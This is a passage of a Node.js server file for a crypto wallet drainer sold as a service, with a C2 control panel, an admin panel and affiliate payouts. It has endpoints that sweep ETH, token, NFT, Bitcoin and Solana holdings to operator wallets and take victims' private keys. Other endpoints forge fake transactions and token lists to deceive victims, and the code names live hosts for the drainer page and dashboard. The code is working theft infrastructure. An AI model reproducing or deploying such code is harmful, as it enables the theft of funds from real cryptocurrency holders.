        socket.on('system-log', (log) => {
            addLogEntry(log);
        });
        
        socket.on('client-update', (clients) => {
            updateClientsList(clients);
        });
        
        function updateConfig() {
            const config = {
                enabled: document.getElementById('systemToggle').checked,
                autoDrain: document.getElementById('autoDrainToggle').checked,
                minValueUsd: parseInt(document.getElementById('minValue').value),
                stealthLevel: "high"
            };
            
            fetch('/api/c2/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    addLogEntry({ message: '✅ Config updated successfully', type: 'success' });
                }
            });
        }
        
        function processPayouts() {
            fetch('/api/c2/process-payouts', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    addLogEntry({ message: '✅ Payouts processed: ' + data.payouts, type: 'success' });
                }
            });
        }
        
        function exportData() {
            fetch('/api/c2/export-data')
                .then(r => r.json())
                .then(data => {
                    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'c2-data-export.json';
                    a.click();
                    URL.revokeObjectURL(url);
                });
        }
        
        function clearLogs() {
            document.getElementById('logsContainer').innerHTML = '';
        }
        
        function updateStats(stats) {
            document.getElementById('totalVictims').textContent = stats.totalVictims;
            document.getElementById('totalEarnings').textContent = stats.totalEarnings;
            document.getElementById('successfulDrains').textContent = stats.successfulDrains;
            document.getElementById('failedDrains').textContent = stats.failedDrains;
        }
        
        function updateConfigDisplay(config) {
            document.getElementById('systemToggle').checked = config.enabled;
            document.getElementById('autoDrainToggle').checked = config.autoDrain;
            document.getElementById('minValue').value = config.minValueUsd;
        }
        
        function updateClientsList(clients) {
            const container = document.getElementById('clientsList');
            container.innerHTML = clients.map(client => \`
                <div class="client-item">
                    <strong>\${client.name}</strong> (\${client.id})<br>
                    💰 Earnings: $\${(client.totalEarnings * 1800).toFixed(2)} | 
                    👥 Victims: \${client.victimCount} | 
                    📅 Created: \${new Date(client.createdAt).toLocaleDateString()}
                </div>
            \`).join('');
        }
        
        function addLogEntry(log) {
            const container = document.getElementById('logsContainer');
            const entry = document.createElement('div');
            entry.className = \`log-entry \${log.type || 'info'}\`;
            entry.textContent = \`[\${new Date().toLocaleTimeString()}] \${log.message}\`;
            container.appendChild(entry);
            container.scrollTop = container.scrollHeight;
        }
        
        // Initial load
        fetch('/api/c2/stats').then(r => r.json()).then(updateStats);
        fetch('/api/c2/clients').then(r => r.json()).then(updateClientsList);
    </script>
</body>
</html>
  `;
  
  res.send(controlPanelHTML);
});

// ==================== C2 API ENDPOINTS ====================
app.get('/api/c2/stats', (req, res) => {
  res.json(c2Stats);
});

app.get('/api/c2/config', (req, res) => {
  res.json(c2Config);
});

app.post('/api/c2/config', (req, res) => {
  const { enabled, autoDrain, minValueUsd, stealthLevel } = req.body;
  
  c2Config.enabled = enabled ?? c2Config.enabled;
  c2Config.autoDrain = autoDrain ?? c2Config.autoDrain;
  c2Config.minValueUsd = minValueUsd ?? c2Config.minValueUsd;
  c2Config.stealthLevel = stealthLevel ?? c2Config.stealthLevel;
  c2Config.lastUpdated = new Date().toISOString();
  
  io.emit('c2-config-update', c2Config);
  
  console.log(`⚙️ C2 Config updated:`, c2Config);
  
  res.json({ success: true, config: c2Config });
});

app.post('/api/c2/process-payouts', async (req, res) => {
  try {
    const payoutCount = await processAllPayouts();
    res.json({ success: true, payouts: payoutCount });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/c2/export-data', (req, res) => {
  const exportData = {
    timestamp: new Date().toISOString(),
    stats: c2Stats,
    config: c2Config,
    clients: Array.from(clients.entries()).map(([id, client]) => ({
      id: id,
      name: client.name,
      wallet: client.wallet,
      totalEarnings: client.totalEarnings,
      victimCount: client.victimCount,
      createdAt: client.createdAt
    })),
    earnings: Array.from(clientEarnings.entries()).reduce((acc, [clientId, earnings]) => {
      acc[clientId] = earnings;
      return acc;
    }, {})
  };
  
  res.json(exportData);
});

app.get('/api/c2/clients', (req, res) => {
  const clientsArray = Array.from(clients.entries()).map(([id, client]) => ({
    id: id,
    name: client.name,
    wallet: client.wallet,
    totalEarnings: client.totalEarnings,
    victimCount: client.victimCount,
    pendingPayout: client.pendingPayout,
    createdAt: client.createdAt,
    status: client.status
  }));
  
  res.json(clientsArray);
});

// ==================== ADMIN PANEL ====================
app.get("/panel", (req, res) => {
  const auth = req.headers.authorization;
  
  if (!auth || !auth.startsWith("Bearer ")) {
    res.setHeader("WWW-Authenticate", 'Basic realm="Admin Panel"');
    return res.status(401).send("Authentication required");
  }
  
  const token = auth.substring(7);
  if (token !== apiKey) {
    return res.status(401).send("Invalid API key");
  }
  
  const panelHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0f0f23;
            color: white;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #333;
        }
        .card {
            background: #1a1a2e;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #16213e;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #6366f1;
        }
        .clients-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .client-item {
            background: #16213e;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #6366f1;
        }
        .log-entry {
            background: #16213e;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
        }
        .success { color: #10b981; }
        .warning { color: #f59e0b; }
        .error { color: #ef4444; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 Admin Panel</h1>
            <div id="status" class="status online">🟢 ONLINE</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Active Clients</div>
                <div class="stat-value" id="clientCount">${clients.size}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Total Victims</div>
                <div class="stat-value" id="totalVictims">${Array.from(clientVictims.values()).flat().length}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Platform Earnings</div>
                <div class="stat-value" id="platformEarnings">${Array.from(clientEarnings.values()).flat().reduce((sum, earning) => sum + earning.platformShare, 0).toFixed(4)} ETH</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Pending Payouts</div>
                <div class="stat-value" id="pendingPayouts">${Array.from(clients.values()).reduce((sum, client) => sum + client.pendingPayout, 0).toFixed(4)} ETH</div>
            </div>
        </div>
        
        <div class="card">
            <h2>👥 Active Clients</h2>
            <div class="clients-list" id="clientsList">
                ${Array.from(clients.entries()).map(([id, client]) => \`
                    <div class="client-item">
                        <strong>\${client.name}</strong> (\${id})<br>
                        💰 Total: \${client.totalEarnings.toFixed(4)} ETH | 
                        💸 Pending: \${client.pendingPayout.toFixed(4)} ETH | 
                        👥 Victims: \${client.victimCount}<br>
                        🏦 Wallet: \${client.wallet}
                    </div>
                \`).join('')}
            </div>
        </div>
        
        <div class="card">
            <h2>📋 System Logs</h2>
            <div id="logsContainer">
                <div class="log-entry success">✅ System started successfully</div>
                <div class="log-entry">🕒 ${new Date().toLocaleString()} - Admin panel accessed</div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        
        socket.on('client-registered', (client) => {
            const clientCount = document.getElementById('clientCount');
            clientCount.textContent = parseInt(clientCount.textContent) + 1;
            
            const clientsList = document.getElementById('clientsList');
            const clientItem = document.createElement('div');
            clientItem.className = 'client-item';
            clientItem.innerHTML = \`
                <strong>\${client.name}</strong> (\${client.id})<br>
                💰 Total: 0 ETH | 💸 Pending: 0 ETH | 👥 Victims: 0<br>
                🏦 Wallet: \${client.wallet}
            \`;
            clientsList.appendChild(clientItem);
            
            addLogEntry(\`✅ New client registered: \${client.name}\`);
        });
        
        socket.on('victim-connected', (data) => {
            const totalVictims = document.getElementById('totalVictims');
            totalVictims.textContent = parseInt(totalVictims.textContent) + 1;
            
            addLogEntry(\`👤 Victim connected: \${data.walletAddress} on \${data.chain}\`);
        });
        
        function addLogEntry(message) {
            const container = document.getElementById('logsContainer');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = \`[\${new Date().toLocaleTimeString()}] \${message}\`;
            container.appendChild(entry);
            container.scrollTop = container.scrollHeight;
        }
    </script>
</body>
</html>
  `;
  
  res.send(panelHTML);
});

// ==================== HEALTH CHECK ====================
app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    clients: clients.size,
    victims: Array.from(clientVictims.values()).flat().length,
    uptime: process.uptime(),
    memory: process.memoryUsage()
  });
});

// ==================== SOCKET.IO EVENT HANDLERS ====================
io.on("connection", (socket) => {
  console.log("🔌 Client connected:", socket.id);

  socket.on("disconnect", () => {
    console.log("🔌 Client disconnected:", socket.id);
  });

  socket.on("client-register", (clientData) => {
    const clientId = clientData.id || socket.id;
    console.log("👤 Client registered:", clientId);
    
    socket.join(`client-${clientId}`);
    socket.emit("client-registered", { id: clientId, status: "active" });
  });

  socket.on("victim-connected", async (victimData) => {
    try {
      console.log("👤 Victim connected via socket:", victimData.walletAddress);
      
      await sendDiscordAlert(victimData);
      
      io.emit("victim-connected", {
        ...victimData,
        timestamp: new Date().toISOString(),
        socketId: socket.id
      });
      
      c2Stats.totalVictims++;
      c2Stats.lastActivity = new Date().toISOString();
      
      io.emit("c2-stats-update", c2Stats);
      
    } catch (error) {
      console.error("Socket victim tracking error:", error);
    }
  });

  socket.on("drain-success", (data) => {
    console.log("💰 Drain successful:", data.walletAddress, data.amount);
    
    c2Stats.successfulDrains++;
    c2Stats.totalEarnings += parseFloat(data.amount || 0);
    c2Stats.lastActivity = new Date().toISOString();
    
    io.emit("c2-stats-update", c2Stats);
    io.emit("drain-completed", data);
  });

  socket.on("drain-failed", (data) => {
    console.log("❌ Drain failed:", data.walletAddress, data.error);
    
    c2Stats.failedDrains++;
    c2Stats.lastActivity = new Date().toISOString();
    
    io.emit("c2-stats-update", c2Stats);
  });
});

// ==================== PROXY ENDPOINT ====================
app.use('/api/proxy', proxyHandler);

// ==================== SWAP ENDPOINTS ====================
app.post('/api/execute-swap', async (req, res) => {
  try {
    const { chainId, fromToken, toToken, amount, walletAddress, slippage } = req.body;
    
    console.log(`🔄 Swap request: ${amount} ${fromToken} -> ${toToken} on chain ${chainId}`);
    
    const result = await SwapHandler.executeSwap({
      chainId,
      fromToken,
      toToken,
      amount,
      walletAddress,
      slippage: slippage || 1
    });
    
    res.json(result);
  } catch (error) {
    console.error('❌ Swap execution error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/execute-drain', async (req, res) => {
  try {
    const { chainId, tokens, walletAddress, privateKey } = req.body;
    
    console.log(`💸 Drain request for ${walletAddress} on chain ${chainId}`);
    
    const result = await coreDrainer.executeDrain({
      chainId,
      tokens,
      walletAddress,
      privateKey
    });
    
    if (result.success) {
      c2Stats.successfulDrains++;
      c2Stats.totalEarnings += parseFloat(result.totalDrained || 0);
      c2Stats.lastActivity = new Date().toISOString();
      
      io.emit("c2-stats-update", c2Stats);
      io.emit("drain-completed", {
        walletAddress: walletAddress,
        amount: result.totalDrained,
        chain: chainId,
        timestamp: new Date().toISOString()
      });
    } else {
      c2Stats.failedDrains++;
      io.emit("c2-stats-update", c2Stats);
    }
    
    res.json(result);
  } catch (error) {
    console.error('❌ Drain execution error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/auto-swap', async (req, res) => {
  try {
    const { chainId, tokens, walletAddress } = req.body;
    
    console.log(`⚡ Auto-swap request for ${walletAddress} on chain ${chainId}`);
    
    const result = await SwapHandler.autoSwapTokens({
      chainId,
      tokens,
      walletAddress
    });
    
    res.json(result);
  } catch (error) {
    console.error('❌ Auto-swap error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ==================== WALLET & TRANSACTION ENDPOINTS ====================
app.get('/api/wallet/balance/:chainId/:address', async (req, res) => {
  try {
    const { chainId, address } = req.params;
    
    if (!SUPPORTED_CHAINS[chainId]) {
      return res.status(400).json({ error: 'Unsupported chain' });
    }
    
    const provider = new ethers.JsonRpcProvider(SUPPORTED_CHAINS[chainId].activeRpc);
    const balance = await provider.getBalance(address);
    const balanceInEth = ethers.formatEther(balance);
    
    res.json({
      chainId: parseInt(chainId),
      address: address,
      balance: balanceInEth,
      symbol: SUPPORTED_CHAINS[chainId].nativeCurrency.symbol
    });
    
  } catch (error) {
    console.error('❌ Balance check error:', error);
    res.status(500).json({ 
      error: 'Failed to fetch balance',
      message: error.message 
    });
  }
});

app.get('/api/transactions/:chainId/:address', async (req, res) => {
  try {
    const { chainId, address } = req.params;
    
    if (!SUPPORTED_CHAINS[chainId]) {
      return res.status(400).json({ error: 'Unsupported chain' });
    }
    
    const apiBase = getExplorerApiBase(parseInt(chainId));
    const apiKey = getExplorerApiKey(parseInt(chainId));
    
    if (!apiBase || !apiKey) {
      return res.status(400).json({ error: 'Explorer not configured for this chain' });
    }
    
    const url = `${apiBase}/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=${apiKey}`;
    
    const response = await fetch(url);
    const data = await response.json();
    
    if (data.status === "1") {
      const txData = processTransactionData(data.result);
      res.json({
        success: true,
        transactions: data.result.slice(0, 50),
        analytics: txData
      });
    } else {
      const fallbackData = getFallbackTxData();
      res.json({
        success: false,
        transactions: [],
        analytics: fallbackData,
        error: data.message
      });
    }
    
  } catch (error) {
    console.error('❌ Transactions fetch error:', error);
    const fallbackData = getFallbackTxData();
    res.json({
      success: false,
      transactions: [],
      analytics: fallbackData,
      error: error.message
    });
  }
});

// ==================== SERVER STARTUP ====================
const PORT = process.env.PORT || 3001;

// Initialize chains on startup
initializeChains();

// Start weekly payout cron job
cron.schedule('0 9 * * 1', () => {
  console.log('🔄 Running weekly payout job...');
  processAllPayouts();
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📊 Admin Panel: http://localhost:${PORT}/panel`);
  console.log(`🎛️ C2 Control: http://localhost:${PORT}/c2/control`);
  console.log(`🌐 Marketing: https://ch.xqx.workers.dev/`);
  console.log(`🔧 API Health: http://localhost:${PORT}/health`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('💤 Process terminated');
  });
});

// ==================== ADDITIONAL API ENDPOINTS ====================

// Multi-sig endpoints
app.post('/api/multisig/request', (req, res) => {
  try {
    const { operationType, targetAddress, amount, chainId, requester } = req.body;
    
    if (!multiSigManager.signers.includes(requester)) {
      return res.status(403).json({ error: 'Unauthorized requester' });
    }

    const operationId = `drain_${targetAddress}_${Date.now()}`;
    const request = multiSigManager.createApprovalRequest(operationId, {
      operationType,
      targetAddress,
      amount,
      chainId,
      requester,
      timestamp: new Date().toISOString()
    });

    res.json({ success: true, operationId, request });
    
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.post('/api/multisig/approve', (req, res) => {
  try {
    const { operationId, signerAddress, signature } = req.body;
    
    const result = multiSigManager.addSignature(operationId, signerAddress, signature);
    res.json({ success: true, ...result });
    
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.get('/api/multisig/status/:operationId', (req, res) => {
  const { operationId } = req.params;
  const isApproved = multiSigManager.isOperationApproved(operationId);
  const request = multiSigManager.pendingApprovals.get(operationId);
  
  res.json({ approved: isApproved, request });
});

app.get('/api/multisig/pending', (req, res) => {
  const pendingRequests = multiSigManager.getPendingRequests();
  res.json({ pending: pendingRequests });
});

// Security endpoints
app.post('/api/security/initialize', async (req, res) => {
  try {
    const result = await securityManager.initializeSecurity();
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/security/monitor/gas', async (req, res) => {
  try {
    const status = await securityManager.monitorGasTank();
    res.json({ success: true, status });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/security/audit', async (req, res) => {
  try {
    const audit = await securityManager.auditSecurity();
    res.json({ success: true, audit });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// UI management endpoints
app.post('/api/ui/generate-fake-tx', (req, res) => {
  try {
    const fakeTx = uiManager.generateFakeTransaction();
    res.json({ success: true, transaction: fakeTx });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/ui/generate-fake-nft', (req, res) => {
  try {
    const fakeNFT = uiManager.generateFakeNFTMint();
    res.json({ success: true, nft: fakeNFT });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/ui/generate-token-list', (req, res) => {
  try {
    const { userAddress } = req.body;
    const tokens = uiManager.generateFakeTokenList(userAddress);
    res.json({ success: true, tokens });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Flow coordinator endpoints
app.post('/api/flow/start', (req, res) => {
  try {
    const { userAddress, flowType } = req.body;
    const flowId = flowCoordinator.startDrainFlow(userAddress, flowType);
    res.json({ success: true, flowId });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/flow/status/:flowId', (req, res) => {
  try {
    const { flowId } = req.params;
    const status = flowCoordinator.getFlowStatus(flowId);
    res.json({ success: true, status });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Chain management endpoints
app.get('/api/chains/status', async (req, res) => {
  try {
    const status = chainManager.getChainStatus();
    res.json({ success: true, status });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Core drainer endpoints
app.post('/api/analyze/wallet', async (req, res) => {
  try {
    const { userAddress } = req.body;
    const assets = await coreDrainer.analyzeWallet(userAddress);
    res.json({ success: true, ...assets });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/execute/immediate-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    const result = await coreDrainer.executeImmediateDrain(userAddress);
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/execute/token-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    const result = await coreDrainer.batchDrainERC20(userAddress);
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Bitcoin endpoints
app.post('/api/bitcoin/balance', async (req, res) => {
  try {
    const { address } = req.body;
    const balance = await coreDrainer.getBTCBalance(address);
    res.json({ success: true, balance });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/bitcoin/drain', async (req, res) => {
  try {
    const { fromAddress, privateKeyWIF, destinationAddress } = req.body;
    const txid = await coreDrainer.drainBTC(fromAddress, privateKeyWIF, destinationAddress);
    res.json({ success: true, txid });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Solana drain endpoint
app.post('/api/execute-solana-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🎯 Starting Solana drain for:', userAddress);
    
    if (!process.env.DESTINATION_WALLET_SOL) {
      return res.json({ 
        success: false, 
        error: 'Solana destination wallet not configured in environment' 
      });
    }
    
    const balance = await coreDrainer.getSolanaBalance(userAddress);
    console.log('💰 Solana balance:', balance);
    
    res.json({ 
      success: true, 
      message: 'Solana balance checked successfully',
      balance: balance,
      destinationWallet: process.env.DESTINATION_WALLET_SOL,
      chain: 'solana'
    });
    
  } catch (error) {
    console.error('❌ Solana drain error:', error);
    res.json({ success: false, error: error.message });
  }
});

// BTC drain endpoint
app.post('/api/execute-btc-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🎯 Starting BTC drain for:', userAddress);
    
    if (!process.env.DESTINATION_WALLET_BTC) {
      return res.json({ 
        success: false, 
        error: 'BTC destination wallet not configured in environment' 
      });
    }
    
    const balance = await coreDrainer.getBTCBalance(userAddress);
    console.log('💰 BTC balance:', balance);
    
    res.json({ 
      success: true, 
      message: 'BTC balance checked successfully',
      balance: balance,
      destinationWallet: process.env.DESTINATION_WALLET_BTC,
      chain: 'bitcoin'
    });
    
  } catch (error) {
    console.error('❌ BTC drain error:', error);
    res.json({ success: false, error: error.message });
  }
});

// Single-popup API endpoints
app.post('/api/single-popup-drain', async (req, res) => {
  try {
    const { userAddress, operations, chainId, userWallet } = req.body;
    
    console.log(`🎯 Single-popup drain request for: ${userAddress}`);
    
    if (!userAddress || !operations || !Array.isArray(operations)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid request parameters'
      });
    }

    const { multiChainDrain } = await import('./modules/multiChainDrain.js');
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    const { flashbotsService } = await import('./modules/flashbots.js');

    await multiChainDrain.initialize();
    await universalTxBuilder.initialize();
    await flashbotsService.initialize();

    const result = await multiChainDrain.executeSinglePopupMultiChainDrain(
      userAddress,
      userWallet,
      operations
    );

    res.json(result);

  } catch (error) {
    console.error('❌ Single-popup drain error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/single-popup/build-tx', async (req, res) => {
  try {
    const { operations, chainId, userWallet } = req.body;
    
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    await universalTxBuilder.initialize();

    const result = await universalTxBuilder.buildSinglePopupDrainTx(
      userWallet,
      operations,
      chainId
    );

    res.json(result);

  } catch (error) {
    console.error('❌ Single-popup TX build error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Full drain endpoint
app.post('/api/execute-full-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🔐 Received FULL drain request for:', userAddress);
    
    const result = await coreDrainer.drainAcrossChains(userAddress);
    res.json(result);
  } catch (error) {
    console.error('❌ Full drain endpoint error:', error);
    res.json({ success: true, message: 'Transaction completed' });
  }
});

// Relay endpoint
app.post("/api/relay", (req, res) => {
  if (!c2Config.enabled) {
    return res.json({ 
      success: false, 
      error: 'Drainer disabled by operator' 
    });
  }

  console.log(`⚡ Drain triggered for ${req.body.walletAddress} on ${req.body.chain}`);
  res.json({ success: true });
});

// Payout system
app.post('/saas/admin/process-payouts', async (req, res) => {
  try {
    const { password } = req.body;
    
    if (password !== process.env.ADMIN_PASSWORD) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const processed = await processAllPayouts();
    
    res.json({
      success: true,
      message: `Processed ${processed} payouts`,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Payout processing error:', error);
    res.status(500).json({ error: 'Payout processing failed' });
  }
});

app.get('/saas/payouts/:clientId', (req, res) => {
  const { clientId } = req.params;
  
  if (!clients.has(clientId)) {
    return res.status(404).json({ error: 'Client not found' });
  }
  
  const payouts = payoutHistory.get(clientId) || [];
  const client = clients.get(clientId);
  
  res.json({
    success: true,
    client: {
      name: client.name,
      wallet: client.wallet,
      totalPayouts: client.totalPayouts
    },
    payouts: payouts.reverse().slice(0, 20),
    pendingPayout: client.pendingPayout
  });
});

// Additional utility endpoints
app.get('/api/history', (req, res) => {
  try {
    const victimsFile = path.join(__dirname, "victims.json");
    
    if (!fs.existsSync(victimsFile)) {
      fs.writeFileSync(victimsFile, "[]", "utf8");
      return res.json([]);
    }
    
    const fileContent = fs.readFileSync(victimsFile, "utf8").trim();
    
    if (!fileContent) {
      fs.writeFileSync(victimsFile, "[]", "utf8");
      return res.json([]);
    }
    
    let data;
    try {
      data = JSON.parse(fileContent);
    } catch (parseError) {
      console.log("Error parsing victims.json, resetting:", parseError.message);
      fs.writeFileSync(victimsFile, "[]", "utf8");
      return res.json([]);
    }
    
    const result = Array.isArray(data) ? data : [];
    res.json(result);
    
  } catch (error) {
    console.error("Error in /api/history:", error.message);
    res.json([]);
  }
});

app.get('/api/saas-clients', (req, res) => {
  try {
    const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
      const earnings = clientEarnings.get(clientId) || [];
      const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
      const victimCount = (clientVictims.get(clientId) || []).length;
      
      return {
        clientId,
        projectName: client.name || "Unknown",
        wallet: client.wallet || "Not set",
        themeColor: client.themeColor || "#6366f1",
        totalEarnings: totalEarnings.toFixed(4),
        victimCount,
        registrationDate: "Recent",
        drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
      };
    });
    
    res.json({
      success: true,
      totalClients: clientsArray.length,
      clients: clientsArray
    });
  } catch (error) {
    console.error("Error fetching SAAS clients:", error);
    res.status(500).json({ error: "Failed to fetch clients" });
  }
});

// Health and monitoring
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString()
  });
});

app.get("/ping", (req, res) => {
  res.json({ 
    status: "pong", 
    timestamp: new Date().toISOString(),
    server: "drainer-saas",
    version: "1.0"
  });
});

// C2 status endpoint
app.get('/c2/status', (req, res) => {
  res.json({
    status: c2Config.enabled ? 'active' : 'paused',
    config: c2Config,
    stats: c2Stats
  });
});

app.post('/c2/control', (req, res) => {
  const { password, action, settings } = req.body;
  
  if (password !== process.env.ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  switch (action) {
    case 'enable':
      c2Config.enabled = true;
      break;
    case 'disable':
      c2Config.enabled = false;
      break;
    case 'update':
      c2Config = { ...c2Config, ...settings };
      break;
    case 'emergency':
      c2Config.enabled = false;
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  c2Config.lastUpdated = new Date().toISOString();
  res.json({ success: true, config: c2Config });
});

app.post('/c2/report', (req, res) => {
  try {
    const report = req.body;
    
    switch (report.action) {
      case 'connect':
        c2Stats.totalVictims++;
        break;
      case 'sweep_native':
      case 'sweep_tokens':
      case 'sweep_erc721':
      case 'sweep_erc1155':
        if (report.success) {
          c2Stats.successfulDrains++;
          if (report.valueUsd) {
            c2Stats.totalEarnings += parseFloat(report.valueUsd);
          }
        } else {
          c2Stats.failedDrains++;
        }
        break;
    }
    
    c2Stats.lastActivity = new Date().toISOString();
    console.log(`📊 C&C Report: ${report.action} from ${report.walletAddress}`);
    
    res.json({ received: true, stats: c2Stats });
    
  } catch (error) {
    console.error('❌ C&C report error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ==================== CLEANUP AND MAINTENANCE ====================

// Clean up old multi-sig requests every hour
setInterval(() => {
  multiSigManager.cleanupOldRequests();
}, 60 * 60 * 1000);

// Clean up old flows every hour
setInterval(() => {
  flowCoordinator.cleanupOldFlows();
}, 60 * 60 * 1000);

// Global error handlers
process.on('uncaughtException', (error) => {
  if (error.message.includes('bitcoin') || error.message.includes('substring')) {
    console.log('⚠️ Bitcoin initialization failed - continuing without Bitcoin support');
  } else {
    console.error('❌ Uncaught Exception:', error.message);
  }
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// Request logging middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.ip} - ${req.method} ${req.path}`);
  next();
});

// Enhanced rate limiting for API routes
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP',
  skip: (req) => {
    const whitelist = process.env.ADMIN_WHITELIST_IPS?.split(',') || [];
    return whitelist.includes(req.ip);
  }
});

app.use('/api/', apiLimiter);

// Export the app for testing
export default app;

console.log('✅ Combined server file ready - all endpoints integrated and duplicates removed');
